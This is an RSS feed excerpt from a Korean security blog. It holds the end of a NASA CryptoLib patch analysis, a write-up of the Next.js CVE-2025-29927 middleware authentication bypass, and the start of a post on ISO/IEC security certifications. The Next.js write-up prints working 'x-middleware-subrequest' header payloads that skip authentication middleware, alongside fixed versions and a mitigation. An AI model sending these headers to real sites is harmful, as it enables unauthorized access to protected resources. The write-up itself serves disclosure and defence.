class="hljs-comment">// Length coded as total length of secondary header - 1</span>            <span class="hljs-comment">// Reference CCSDS 132.0-B-2 4.1.3.2.3</span>            *secondary_hdr_len = (p_ingest[*byte_idx] &amp; <span class="hljs-number">0x3F</span>) + <span class="hljs-number">1</span>;<span class="hljs-meta">#<span class="hljs-meta-keyword">ifdef</span> TM_DEBUG</span>            <span class="hljs-built_in">printf</span>(KYEL <span class="hljs-string">&quot;Secondary Header Length is decoded as: %d\n&quot;</span>, *secondary_hdr_len);<span class="hljs-meta">#<span class="hljs-meta-keyword">endif</span></span>            <span class="hljs-comment">// We have a secondary header length now, is it sane?</span>            <span class="hljs-comment">// Does it violate spec maximum?</span>            <span class="hljs-comment">// Reference CCSDS 1320b3 4.1.3.1.3</span>            <span class="hljs-comment">// <span class="hljs-doctag">TODO:</span> Add a test</span>            <span class="hljs-keyword">if</span> (*secondary_hdr_len &gt; TM_SECONDARY_HDR_MAX_VALUE)            {                status = CRYPTO_LIB_ERR_TM_SECONDARY_HDR_SIZE;                mc_if-&gt;mc_log(status);                <span class="hljs-keyword">return</span> status;            }            <span class="hljs-comment">// Does it &apos;fit&apos; in the overall frame correctly?</span>            <span class="hljs-comment">// We can&apos;t validate it down to the byte yet,</span>            <span class="hljs-comment">// we don&apos;t know the variable lengths from the SA yet</span>            <span class="hljs-comment">// Protects from overruns on very short max frame sizes</span>            <span class="hljs-comment">// Smallest frame here is Header | Secondary Header | SPI | 1 byte data</span>            <span class="hljs-comment">// <span class="hljs-doctag">TODO:</span> Add a test</span>            <span class="hljs-keyword">if</span> (len_ingest &lt; (*byte_idx + *secondary_hdr_len + SPI_LEN + <span class="hljs-number">1</span>))            {                status = CRYPTO_LIB_ERR_TM_SECONDARY_HDR_SIZE;                mc_if-&gt;mc_log(status);                <span class="hljs-keyword">return</span> status;            }            <span class="hljs-comment">// Increment from current byte (1st byte of secondary header),</span>            <span class="hljs-comment">// to where the SPI would start</span>            *byte_idx += *secondary_hdr_len;@@ <span class="hljs-number">-1286</span>,<span class="hljs-number">6</span> +<span class="hljs-number">1309</span>,<span class="hljs-number">7</span> @@            <span class="hljs-comment">// No Secondary header, carry on as usual and increment to SPI start</span>            *byte_idx = <span class="hljs-number">6</span>;        }    }</code></pre><blockquote><p><a href="https://github.com/nasa/CryptoLib/commit/4328a713c4a405a3271cf115e8e7bebfeeba3b95?diff=split">https://github.com/nasa/CryptoLib/commit/4328a713c4a405a3271cf115e8e7bebfeeba3b95?diff=split</a></p></blockquote><p>&#xCDE8;&#xC57D;&#xC810;&#xC758; &#xD328;&#xCE58;&#xB294; <code>len_ingest &lt; (*byte_idx + *secondary_hdr_len + SPI_LEN + 1)</code> &#xC870;&#xAC74;&#xC2DD;&#xC744; &#xCD94;&#xAC00;&#xD574; <code>len_ingest</code>&#xBCF4;&#xB2E4; &#xD06C;&#xBA74; <code>CRYPTO_LIB_ERR_TM_SECONDARY_HDR_SIZE</code> &#xC5D0;&#xB7EC;&#xB97C; &#xBC1C;&#xC0DD;&#xC2DC;&#xD0A4;&#xB294; &#xAC83;&#xC73C;&#xB85C; &#xC774;&#xB8E8;&#xC5B4;&#xC84C;&#xC2B5;&#xB2C8;&#xB2E4;.</p>]]></content:encoded>
      
      
      <category domain="https://hackyboiz.github.io/categories/1day1line/">1day1line</category>
      
      
      <category domain="https://hackyboiz.github.io/tags/DoS/">DoS</category>
      
      <category domain="https://hackyboiz.github.io/tags/RCE/">RCE</category>
      
      <category domain="https://hackyboiz.github.io/tags/L0ch/">L0ch</category>
      
      <category domain="https://hackyboiz.github.io/tags/cryptolib/">cryptolib</category>
      
      <category domain="https://hackyboiz.github.io/tags/heap-buffer-overflow/">heap_buffer_overflow</category>
      
      <category domain="https://hackyboiz.github.io/tags/nasa/">nasa</category>
      
      <category domain="https://hackyboiz.github.io/tags/CCSDS-Protocol/">CCSDS_Protocol</category>
      
      
      <comments>https://hackyboiz.github.io/2025/03/29/l0ch/2025-03-29/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>[하루한줄] CVE-2025-29927: Next.js 미들웨어 기반 인증 우회 취약점</title>
      <link>https://hackyboiz.github.io/2025/03/27/bekim/2025-03-27/</link>
      <guid>https://hackyboiz.github.io/2025/03/27/bekim/2025-03-27/</guid>
      <pubDate>Thu, 27 Mar 2025 08:00:00 GMT</pubDate>
      
        
        
      <description>&lt;h2 id=&quot;URL&quot;&gt;&lt;a href=&quot;#URL&quot; class=&quot;headerlink&quot; title=&quot;URL&quot;&gt;&lt;/a&gt;URL&lt;/h2&gt;&lt;p&gt;&lt;a href=&quot;https://nvd.nist.gov/vuln/detail/CVE-2025-29927&quot;&gt;https://</description>
        
      
      
      
      <content:encoded><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://nvd.nist.gov/vuln/detail/CVE-2025-29927">https://nvd.nist.gov/vuln/detail/CVE-2025-29927</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><ul><li>Next.js 15.x &lt; 15.2.3</li><li>Next.js 14.x &lt; 14.2.25</li><li>Next.js 13.x &lt; 13.5.9</li></ul><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>&#xD574;&#xB2F9; &#xCDE8;&#xC57D;&#xC810;&#xC740; Next.js &#xD504;&#xB808;&#xC784;&#xC6CC;&#xD06C;&#xC758; &#xBBF8;&#xB4E4;&#xC6E8;&#xC5B4;&#xC5D0;&#xC11C; &#xBC1C;&#xC0DD;&#xD558;&#xB294; &#xBCF4;&#xC548; &#xCDE8;&#xC57D;&#xC810;&#xC73C;&#xB85C;, &#xACF5;&#xACA9;&#xC790;&#xAC00; &#xC778;&#xC99D; &#xC808;&#xCC28;&#xB97C; &#xC6B0;&#xD68C;&#xD558;&#xC5EC; &#xBCF4;&#xD638;&#xB41C; &#xB9AC;&#xC18C;&#xC2A4;&#xC5D0; &#xC811;&#xADFC;&#xD560; &#xC218; &#xC788;&#xAC8C; &#xD569;&#xB2C8;&#xB2E4;.</p><p>Next.js&#xC5D0;&#xC11C; &#xBBF8;&#xB4E4;&#xC6E8;&#xC5B4;&#xB294; &#xC77C;&#xBC18;&#xC801;&#xC73C;&#xB85C; &#xD2B9;&#xC815; &#xD398;&#xC774;&#xC9C0;&#xB098; API &#xACBD;&#xB85C;&#xC5D0; &#xC811;&#xADFC;&#xD558;&#xAE30; &#xC804;&#xC5D0; &#xC0AC;&#xC6A9;&#xC790;&#xC758; &#xC138;&#xC158; &#xCFE0;&#xD0A4;&#xB97C; &#xD655;&#xC778;&#xD558;&#xACE0;, &#xC778;&#xC99D; &#xBC0F; &#xAD8C;&#xD55C; &#xC5EC;&#xBD80;&#xB97C; &#xD310;&#xB2E8;&#xD558;&#xB294; &#xB370; &#xC0AC;&#xC6A9;&#xB429;&#xB2C8;&#xB2E4;. &#xC608;&#xB97C; &#xB4E4;&#xC5B4; &#xC0AC;&#xC6A9;&#xC790;&#xAC00; <code>/dashboard/admin</code>&#xCC98;&#xB7FC; &#xC778;&#xC99D;&#xC774; &#xD544;&#xC694;&#xD55C; &#xACBD;&#xB85C;&#xC5D0; &#xC811;&#xADFC;&#xD558;&#xB824; &#xD560; &#xACBD;&#xC6B0;, &#xC138;&#xC158;&#xC774; &#xC720;&#xD6A8;&#xD558;&#xC9C0; &#xC54A;&#xB2E4;&#xBA74; &#xC694;&#xCCAD;&#xC740; &#xB85C;&#xADF8;&#xC778; &#xD398;&#xC774;&#xC9C0;&#xB85C; &#xB9AC;&#xB514;&#xB809;&#xC158;&#xB429;&#xB2C8;&#xB2E4;.</p><p><a href="https://nextjs.org/docs/messages/middleware-upgrade-guide">Next.js 12.2 &#xC774;&#xC804; &#xBC84;&#xC804;</a>&#xC5D0;&#xC11C;&#xB294; &#xBBF8;&#xB4E4;&#xC6E8;&#xC5B4; &#xD30C;&#xC77C;&#xC758; &#xAD6C;&#xC870;&#xC640; &#xC704;&#xCE58;&#xAC00; &#xACE0;&#xC815;&#xB418;&#xC5B4;&#xC788;&#xB2E4;&#xB294; &#xC810; &#xB54C;&#xBB38;&#xC5D0; &#xBBF8;&#xB4E4;&#xC6E8;&#xC5B4;&#xC758; &#xC815;&#xD655;&#xD55C; &#xC704;&#xCE58;&#xB97C; &#xC608;&#xCE21;&#xD558;&#xAE30; &#xC26C;&#xC6E0;&#xC2B5;&#xB2C8;&#xB2E4;. &#xC774;&#xC804;&#xC5D0;&#xB294; &#xD30C;&#xC77C;&#xBA85;&#xC744; _middleware.ts&#xB85C; &#xC791;&#xC131;&#xD574;&#xC57C; &#xD588;&#xACE0;, App Router&#xAC00; &#xB3C4;&#xC785;&#xB418;&#xAE30; &#xC804;&#xC774;&#xC5C8;&#xAE30; &#xB54C;&#xBB38;&#xC5D0; &#xBBF8;&#xB4E4;&#xC6E8;&#xC5B4;&#xB294; pages/ &#xB514;&#xB809;&#xD1A0;&#xB9AC; &#xD558;&#xC704;&#xC5D0;&#xB9CC; &#xC874;&#xC7AC;&#xD560; &#xC218; &#xC788;&#xC5C8;&#xC2B5;&#xB2C8;&#xB2E4;. &#xC608;&#xB97C; &#xB4E4;&#xC5B4; &#xC804;&#xC5ED; &#xBBF8;&#xB4E4;&#xC6E8;&#xC5B4;&#xB294; pages/_middleware.ts&#xC5D0; &#xC704;&#xCE58;&#xD560; &#xAC00;&#xB2A5;&#xC131;&#xC774; &#xB192;&#xC73C;&#xBBC0;&#xB85C;, &#xC544;&#xB798;&#xC640; &#xAC19;&#xC740; &#xD5E4;&#xB354;&#xB97C; &#xC694;&#xCCAD;&#xC5D0; &#xD3EC;&#xD568;&#xC2DC;&#xD0A4;&#xB294; &#xAC83; &#xB9CC;&#xC73C;&#xB85C;&#xB3C4; &#xD574;&#xB2F9; &#xBBF8;&#xB4E4;&#xC6E8;&#xC5B4;&#xB97C; &#xC6B0;&#xD68C;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs plaintext">x-middleware-subrequest: pages/_middleware</code></pre><p>&#xC774; &#xB3D9;&#xC791;&#xC740; &#xB0B4;&#xBD80;&#xC801;&#xC73C;&#xB85C; <a href="https://github.com/vercel/next.js/blob/v12.0.7/packages/next/server/next-server.ts#L686">&#xB2E4;&#xC74C; &#xCF54;&#xB4DC;</a>&#xC5D0; &#xB530;&#xB77C; &#xCC98;&#xB9AC;&#xB429;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs ts"><span class="hljs-keyword">const</span> subreq = params.request.headers[<span class="hljs-string">`x-middleware-subrequest`</span>]<span class="hljs-keyword">const</span> subrequests = <span class="hljs-keyword">typeof</span> subreq === <span class="hljs-string">&apos;string&apos;</span> ? subreq.split(<span class="hljs-string">&apos;:&apos;</span>) : [] <span class="hljs-comment">//[1]</span><span class="hljs-keyword">const</span> allHeaders = <span class="hljs-keyword">new</span> Headers()<span class="hljs-keyword">let</span> result: FetchEventResult | <span class="hljs-literal">null</span> = <span class="hljs-literal">null</span><span class="hljs-keyword">for</span> (<span class="hljs-keyword">const</span> middleware <span class="hljs-keyword">of</span> <span class="hljs-built_in">this</span>.middleware || []) {<span class="hljs-keyword">if</span> (middleware.match(params.parsedUrl.pathname)) {<span class="hljs-keyword">if</span> (!(<span class="hljs-keyword">await</span> <span class="hljs-built_in">this</span>.hasMiddleware(middleware.page, middleware.ssr))) {<span class="hljs-built_in">console</span>.warn(<span class="hljs-string">`The Edge Function for <span class="hljs-subst">${middleware.page}</span> was not found`</span>)<span class="hljs-keyword">continue</span>}<span class="hljs-keyword">await</span> <span class="hljs-built_in">this</span>.ensureMiddleware(middleware.page, middleware.ssr)<span class="hljs-keyword">const</span> middlewareInfo = getMiddlewareInfo({dev: <span class="hljs-built_in">this</span>.renderOpts.dev,distDir: <span class="hljs-built_in">this</span>.distDir,page: middleware.page,serverless: <span class="hljs-built_in">this</span>._isLikeServerless,})<span class="hljs-keyword">if</span> (subrequests.includes(middlewareInfo.name)) { <span class="hljs-comment">// [2]</span>result = {response: NextResponse.next(),waitUntil: <span class="hljs-built_in">Promise</span>.resolve(),}<span class="hljs-keyword">continue</span>}}</code></pre><p>&#xD074;&#xB77C;&#xC774;&#xC5B8;&#xD2B8;&#xC5D0;&#xC11C; &#xBCF4;&#xB0B8; <code>x-middleware-subrequest</code> &#xD5E4;&#xB354;&#xB97C; &#xC77D;&#xC5B4;, <code>:</code>&#xB97C; &#xAE30;&#xC900;&#xC73C;&#xB85C; &#xBD84;&#xB9AC;&#xB41C; &#xAC12;&#xB4E4;&#xC744; &#xC774;&#xBBF8; &#xC2E4;&#xD589;&#xB41C; &#xBBF8;&#xB4E4;&#xC6E8;&#xC5B4; &#xBAA9;&#xB85D;&#xC73C;&#xB85C; &#xAC04;&#xC8FC;&#xD569;&#xB2C8;&#xB2E4; [1]. &#xADF8;&#xB9AC;&#xACE0; &#xD604;&#xC7AC; &#xC2E4;&#xD589;&#xB420; &#xBBF8;&#xB4E4;&#xC6E8;&#xC5B4;&#xC758; &#xACBD;&#xB85C; &#xC815;&#xBCF4;(middlewareInfo.name)&#xAC00; &#xC774; &#xBBF8;&#xB4E4;&#xC6E8;&#xC5B4; &#xBAA9;&#xB85D;&#xC5D0; &#xD3EC;&#xD568;&#xB418;&#xC5B4; &#xC788;&#xB2E4;&#xBA74;, &#xD574;&#xB2F9; &#xBBF8;&#xB4E4;&#xC6E8;&#xC5B4;&#xB294; &#xC2E4;&#xD589;&#xB418;&#xC9C0; &#xC54A;&#xACE0; &#xB2E4;&#xC74C; &#xB2E8;&#xACC4;&#xB85C; &#xB118;&#xC5B4;&#xAC11;&#xB2C8;&#xB2E4;.[2]</p><p>Next.js 13 &#xBC84;&#xC804;&#xBD80;&#xD130;&#xB294; &#xC7AC;&#xADC0; &#xAC80;&#xC0AC;&#xAC00; &#xAD6C;&#xD604;&#xB418;&#xC5C8;&#xC2B5;&#xB2C8;&#xB2E4;. &#xCDE8;&#xC57D;&#xD55C; &#xCD5C;&#xC2E0; &#xBC84;&#xC804;(v15.2.2)&#xC758; <a href="https://github.com/vercel/next.js/blob/v15.1.7/packages/next/src/server/web/sandbox/sandbox.ts#L94">&#xCF54;&#xB4DC;</a>&#xB294; &#xB2E4;&#xC74C; &#xACFC; &#xAC19;&#xC2B5;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs ts"><span class="hljs-keyword">export</span> <span class="hljs-keyword">const</span> run = withTaggedErrors(<span class="hljs-keyword">async</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">runWithTaggedErrors</span>(<span class="hljs-params">params</span>) </span>{  <span class="hljs-keyword">const</span> runtime = <span class="hljs-keyword">await</span> getRuntimeContext(params)  <span class="hljs-keyword">const</span> subreq = params.request.headers[<span class="hljs-string">`x-middleware-subrequest`</span>]  <span class="hljs-keyword">const</span> subrequests = <span class="hljs-keyword">typeof</span> subreq === <span class="hljs-string">&apos;string&apos;</span> ? subreq.split(<span class="hljs-string">&apos;:&apos;</span>) : []  <span class="hljs-keyword">const</span> MAX_RECURSION_DEPTH = <span class="hljs-number">5</span> <span class="hljs-comment">// [1]</span>  <span class="hljs-keyword">const</span> depth = subrequests.reduce(    (acc, curr) =&gt; (curr === params.name ? acc + <span class="hljs-number">1</span> : acc),    <span class="hljs-number">0</span>  )  <span class="hljs-keyword">if</span> (depth &gt;= MAX_RECURSION_DEPTH) { <span class="hljs-comment">//[2]</span>    <span class="hljs-keyword">return</span> {      waitUntil: <span class="hljs-built_in">Promise</span>.resolve(),      response: <span class="hljs-keyword">new</span> runtime.context.Response(<span class="hljs-literal">null</span>, {        headers: {          <span class="hljs-string">&apos;x-middleware-next&apos;</span>: <span class="hljs-string">&apos;1&apos;</span>,        },      }),    }</code></pre><p>&#xD5E4;&#xB354; <code>x-middleware-subrequest</code>&#xB294; &#xC774;&#xC804;&#xACFC; &#xB9C8;&#xCC2C;&#xAC00;&#xC9C0;&#xB85C; <code>:</code> &#xAE30;&#xD638;&#xB97C; &#xAE30;&#xC900;&#xC73C;&#xB85C; &#xBD84;&#xB9AC;&#xB418;&#xC5B4; &#xBC30;&#xC5F4;&#xB85C; &#xCC98;&#xB9AC;&#xB429;&#xB2C8;&#xB2E4;. &#xD558;&#xC9C0;&#xB9CC; &#xC774;&#xBC88;&#xC5D0;&#xB294; &#xBBF8;&#xB4E4;&#xC6E8;&#xC5B4; &#xADDC;&#xCE59;&#xC744; &#xC6B0;&#xD68C;&#xD558;&#xACE0; &#xC694;&#xCCAD;&#xC744; &#xC9C1;&#xC811; &#xC804;&#xB2EC;&#xD558;&#xB294; &#xC870;&#xAC74;&#xC774; &#xB2EC;&#xB77C;&#xC84C;&#xC2B5;&#xB2C8;&#xB2E4;. <code>MAX_RECURSION_DEPTH</code>&#xB77C;&#xB294; &#xC0C1;&#xC218;(5)&#xB294;, &#xC7AC;&#xADC0;&#xC801;&#xC73C;&#xB85C; &#xBBF8;&#xB4E4;&#xC6E8;&#xC5B4;&#xAC00; &#xC2E4;&#xD589;&#xB418;&#xB294; &#xCD5C;&#xB300; &#xAE4A;&#xC774;&#xB97C; &#xC81C;&#xD55C;&#xD569;&#xB2C8;&#xB2E4;. &#xC694;&#xCCAD;&#xC5D0; &#xD3EC;&#xD568;&#xB41C; <code>x-middleware-subrequest</code> &#xD5E4;&#xB354;&#xC758; &#xAC01; &#xD56D;&#xBAA9; &#xC911;, &#xD604;&#xC7AC; &#xC2E4;&#xD589; &#xC911;&#xC778; &#xBBF8;&#xB4E4;&#xC6E8;&#xC5B4;&#xC758; &#xACBD;&#xB85C;(<code>params.name</code>)&#xC640; &#xC77C;&#xCE58;&#xD558;&#xB294; &#xAC12;&#xC774; &#xC788;&#xC744; &#xB54C;&#xB9C8;&#xB2E4; <code>depth</code> &#xAC12;&#xC774; 1&#xC529; &#xC99D;&#xAC00;&#xD569;&#xB2C8;&#xB2E4;.</p><p><code>depth &gt;= MAX_RECURSION_DEPTH</code> &#xC870;&#xAC74;&#xC744; &#xB9CC;&#xC871;&#xD558;&#xBA74;, &#xD574;&#xB2F9; &#xBBF8;&#xB4E4;&#xC6E8;&#xC5B4;&#xB294; &#xC2E4;&#xD589;&#xB418;&#xC9C0; &#xC54A;&#xACE0;, &#xC694;&#xCCAD;&#xC774; &#xBC14;&#xB85C; &#xB2E4;&#xC74C; &#xB2E8;&#xACC4;&#xB85C; &#xC804;&#xB2EC;&#xB429;&#xB2C8;&#xB2E4;. &#xC608;&#xB97C; &#xB4E4;&#xC5B4; <code>middleware.ts</code>&#xAC00; &#xBBF8;&#xB4E4;&#xC6E8;&#xC5B4; &#xACBD;&#xB85C;&#xB77C;&#xBA74;, &#xB2E4;&#xC74C;&#xACFC; &#xAC19;&#xC740; &#xD5E4;&#xB354;&#xB97C; &#xC0BD;&#xC785;&#xD568;&#xC73C;&#xB85C;&#xC368; &#xC774;&#xB97C; &#xC6B0;&#xD68C;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.<br><pre><code class="hljs plaintext">x-middleware-subrequest: middleware:middleware:middleware:middleware:middleware</code></pre></p><p>&#xB9CC;&#xC57D; src/middleware.ts &#xACBD;&#xB85C;&#xB97C; &#xC0AC;&#xC6A9;&#xD558;&#xB294; &#xACBD;&#xC6B0;&#xB77C;&#xBA74; &#xB2E4;&#xC74C;&#xACFC; &#xAC19;&#xC774; &#xC791;&#xC131;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.<br><pre><code class="hljs plaintext">x-middleware-subrequest: src/middleware:src/middleware:src/middleware:src/middleware:src/middleware</code></pre></p><p>&#xC608;&#xB97C; &#xB4E4;&#xC5B4;, Next.js&#xC5D0;&#xC11C; &#xC778;&#xC99D;&#xC774; &#xD544;&#xC694;&#xD55C; &#xD398;&#xC774;&#xC9C0;&#xC5D0; &#xC811;&#xADFC;&#xD558;&#xB824; &#xD560; &#xACBD;&#xC6B0;, &#xBBF8;&#xB4E4;&#xC6E8;&#xC5B4;&#xC5D0; &#xC758;&#xD574; &#xC694;&#xCCAD;&#xC740; /redirect &#xACBD;&#xB85C;&#xB85C; &#xB9AC;&#xB514;&#xB809;&#xC158;&#xB429;&#xB2C8;&#xB2E4;.<br><img src="/2025/03/27/bekim/2025-03-27/image.png" alt></p><p>&#xC544;&#xB798;&#xB294; <code>x-middleware-subrequest</code> &#xD5E4;&#xB354;&#xB97C; &#xC774;&#xC6A9;&#xD574; &#xC778;&#xC99D;&#xC774; &#xD544;&#xC694;&#xD55C; &#xACBD;&#xB85C;&#xB85C; &#xC811;&#xADFC;&#xD55C; &#xACB0;&#xACFC;&#xC785;&#xB2C8;&#xB2E4;. &#xD5E4;&#xB354; &#xC870;&#xC791;&#xC73C;&#xB85C; &#xC778;&#xD574; 200 &#xC751;&#xB2F5;&#xC774; &#xBC18;&#xD658;&#xB418;&#xBA70; &#xBBF8;&#xB4E4;&#xC6E8;&#xC5B4;&#xB97C; &#xC6B0;&#xD68C;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.<br><img src="/2025/03/27/bekim/2025-03-27/image1.png" alt></p><p>&#xD574;&#xB2F9; &#xCDE8;&#xC57D;&#xC810;&#xC740; &#xC544;&#xB798; &#xBC84;&#xC804;&#xC5D0;&#xC11C; &#xC218;&#xC815;&#xB418;&#xC5C8;&#xC2B5;&#xB2C8;&#xB2E4;</p><ul><li>Next.js 15.x &#x2192; <strong>15.2.3</strong></li><li>Next.js 14.x &#x2192; <strong>14.2.25</strong></li><li>Next.js 13.x &#x2192; <strong>13.5.9</strong></li><li>Next.js 12.x &#x2192; <strong>12.3.5</strong></li></ul><p>&#xC548;&#xC804;&#xD55C; &#xBC84;&#xC804;&#xC73C;&#xB85C;&#xC758; &#xC5C5;&#xADF8;&#xB808;&#xC774;&#xB4DC;&#xAC00; &#xC5B4;&#xB824;&#xC6B4; &#xACBD;&#xC6B0;, <code>x-middleware-subrequest</code> &#xD5E4;&#xB354;&#xAC00; &#xD3EC;&#xD568;&#xB41C; &#xC678;&#xBD80; &#xC694;&#xCCAD;&#xC774; Next.js &#xC560;&#xD50C;&#xB9AC;&#xCF00;&#xC774;&#xC158;&#xC5D0; &#xB3C4;&#xB2EC;&#xD558;&#xC9C0; &#xC54A;&#xB3C4;&#xB85D; &#xC6F9; &#xC11C;&#xBC84;&#xC5D0;&#xC11C; &#xD574;&#xB2F9; &#xD5E4;&#xB354;&#xB97C; &#xC81C;&#xAC70;&#xD558;&#xAC70;&#xB098; &#xD544;&#xD130;&#xB9C1;&#xD558;&#xB294; &#xBC29;&#xC2DD;&#xC73C;&#xB85C; &#xCDE8;&#xC57D;&#xC810;&#xC744; &#xC644;&#xD654;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><ul><li><a href="https://github.com/aydinnyunus/CVE-2025-29927">https://github.com/aydinnyunus/CVE-2025-29927</a></li><li><a href="https://zhero-web-sec.github.io/research-and-things/nextjs-and-the-corrupt-middleware">https://zhero-web-sec.github.io/research-and-things/nextjs-and-the-corrupt-middleware</a></li><li><a href="https://nextjs.org/docs/app/building-your-application/routing/middleware">https://nextjs.org/docs/app/building-your-application/routing/middleware</a></li><li><a href="https://nextjs.org/blog/cve-2025-29927">https://nextjs.org/blog/cve-2025-29927</a></li></ul>]]></content:encoded>
      
      
      <category domain="https://hackyboiz.github.io/categories/1day1line/">1day1line</category>
      
      
      <category domain="https://hackyboiz.github.io/tags/bekim/">bekim</category>
      
      <category domain="https://hackyboiz.github.io/tags/CVE-2025-29927/">CVE-2025-29927</category>
      
      <category domain="https://hackyboiz.github.io/tags/Nextjs/">Nextjs</category>
      
      <category domain="https://hackyboiz.github.io/tags/middleware/">middleware</category>
      
      
      <comments>https://hackyboiz.github.io/2025/03/27/bekim/2025-03-27/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>[Research] Security Certification System(ISO/IEC) (en)</title>
      <link>https://hackyboiz.github.io/2025/03/27/romi0x/security_authentication_en/</link>
      <guid>https://hackyboiz.github.io/2025/03/27/romi0x/security_authentication_en/</guid>
      <pubDate>Thu, 27 Mar 2025 08:00:00 GMT</pubDate>
      
        
        
      <description>&lt;p&gt;Hello, this is romi0x. &amp;#x1F44B;&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;&amp;#x25B3;&amp;#x25B3; Corporation accelerates European expansion with ISO 27001 certifica</description>
        
      
      
      
      <content:encoded><![CDATA[<p>Hello, this is romi0x. &#x1F44B;</p><blockquote><p>&#x25B3;&#x25B3; Corporation accelerates European expansion with ISO 27001 certification</p><p>OO Cloud obtains APEC Privacy Certification &#x2018;CBPR&#x2019;</p><p>Korean startup secures GDPR compliance with ISO 27701 certification</p></blockquote><p>Have you come across headlines like these?</p><p>If your company is expanding globally or working with foreign partners, you&#x2019;ve probably heard of <strong>international security certifications</strong>.</p><p>As regulations like the <strong>GDPR (EU)</strong>, <strong>CCPA (US)</strong>, and personal data transfer laws in countries like <strong>Japan</strong> and <strong>Singapore</strong> continue to diversify, the importance of having a structured certification system to comply with these requirements is growing rapidly.</p><p>In this post, we&#x2019;ll take a closer look at two major international security certification systems:</p><p><strong>ISO/IEC 27001</strong> and <strong>ISO/IEC 27701</strong>.</p><p>Want to learn about Korea&#x2019;s domestic certification system instead?</p><p>Check out these blog posts:</p><p>&#x27A1;&#xFE0F; <a href="https://hackyboiz.github.io/2024/07/07/romi0x/certification_security/">https://hackyboiz.github.io/2024/07/07/romi0x/certification_security/</a></p><p>&#x27A1;&#xFE0F; <a href="https://hackyboiz.github.io/2024/07/21/romi0x/certification_privacy/">https://hackyboiz.github.io/2024/07/21/romi0x/certification_privacy/</a></p><hr><h2 id="What-is-ISO-IEC"><a href="#What-is-ISO-IEC" class="headerlink" title="What is ISO/IEC?"></a>What is ISO/IEC?</h2><p><img src="/2025/03/27/romi0x/security_authentication_en/image.png" alt="image"></p><p>Let&#x2019;s begin with a quick intro to ISO.</p><p>ISO certifications are issued based on <strong>standards developed by the International Organization for Standardization (ISO)</strong>.</p><p>They verify that a company&#x2019;s management system is built and operated in accordance with global best practices.</p><p>ISO has standards for many industries, and for <strong>information security</strong>, some of the most relevant ones include:</p><ol><li><strong>ISO/IEC 27001</strong> &#x2013; Information Security Management System (ISMS)</li><li><strong>ISO/IEC 27002</strong> &#x2013; Security controls implementation guidelines</li><li><strong>ISO/IEC 27017</strong> &#x2013; Guidelines for cloud security</li><li><strong>ISO/IEC 27018</strong> &#x2013; Privacy protection for cloud-based personal data</li><li><strong>ISO/IEC 27701</strong> &#x2013; Privacy Information Management System (PIMS)</li><li><strong>ISO/IEC 27005</strong> &#x2013; Information security risk management</li><li><strong>ISO/IEC 22301</strong> &#x2013; Business Continuity Management System (BCMS)</li></ol><p>Typically, companies begin with <strong>ISO/IEC 27001 (information security)</strong> as a foundation, and then extend to <strong>27701 (privacy)</strong>, <strong>27017/27018 (cloud-specific)</strong> as needed.</p><hr><h2 id="ISO-IEC-27001"><a href="#ISO-IEC-27001" class="headerlink" title="ISO/IEC 27001"></a>ISO/IEC 27001</h2><p><strong>ISO/IEC 27001</strong> is an international standard jointly established by ISO and the International Electrotechnical Commission (IEC).</p><p>It defines the requirements for an <strong>Information Security Management System (ISMS)</strong> that helps organizations protect their information assets and maintain <strong>confidentiality, integrity, and availability</strong> against evolving security threats.</p><p>This certification is globally recognized and applicable to all types of organizations&#x2014;corporates, public entities, cloud providers, etc.&#x2014;and helps them <strong>identify, assess, and manage</strong> security risks.</p><p>ISO 27001 is structured around the <strong>PDCA cycle</strong> (Plan-Do-Check-Act), requiring organizations to continuously plan, implement, review, and improve their security posture.</p><p><img src="/2025/03/27/romi0x/security_authentication_en/image2.png" alt="image"><br><a href="https://cdn.standards.iteh.ai/samples/79612/fc6152007e5648b2b175c1e9c2b4a553/ISO-28000-2022.pdf">https://cdn.standards.iteh.ai/samples/79612/fc6152007e5648b2b175c1e9c2b4a553/ISO-28000-2022.pdf</a></p><p>It covers several areas of information security, including:</p><p><img src="/2025/03/27/romi0x/security_authentication_en/image3.png" alt="image"><br>Audits are conducted by accredited international certification bodies.</p><p>Once certified, an organization undergoes <strong>annual surveillance audits</strong> and a <strong>recertification audit every three years</strong>. These ensure that the system is maintained and improved continuously.</p><hr><h2 id="ISO-IEC-27701"><a href="#ISO-IEC-27701" class="headerlink" title="ISO/IEC 27701"></a>ISO/IEC 27701</h2><p><strong>ISO/IEC 27701</strong> is an extension of ISO 27001 that adds comprehensive requirements for <strong>privacy protection</strong>. It provides a framework for managing <strong>Personally Identifiable Information (PII)</strong> throughout its entire lifecycle&#x2014;from collection to deletion. In short, <strong>ISO 27701 = ISO 27001 + privacy expansion</strong>.</p><p>The main goal of ISO/IEC 27701 is to help organizations meet global privacy regulations like <strong>GDPR, CCPA, APPI (Japan), PDPA (Singapore)</strong>, and to ensure the rights of data subjects are protected.</p><p>Key points:</p><ul><li>Cannot be certified alone &#x2014; <strong>must be built on ISO/IEC 27001</strong></li><li>Differentiates control sets for <strong>PII Controllers</strong> and <strong>PII Processors</strong></li><li>Includes guidelines for consent, third-party sharing, cross-border transfer, data subject rights, and more</li></ul><p><img src="/2025/03/27/romi0x/security_authentication_en/image4.png" alt="image"><br>By obtaining ISO/IEC 27701, your organization demonstrates <strong>accountability in privacy management</strong>, not just basic security controls.</p><hr><h2 id="What-about-Korea-ISMS-and-ISMS-P"><a href="#What-about-Korea-ISMS-and-ISMS-P" class="headerlink" title="What about Korea? ISMS and ISMS-P"></a>What about Korea? ISMS and ISMS-P</h2><p>South Korea also operates a national certification system for 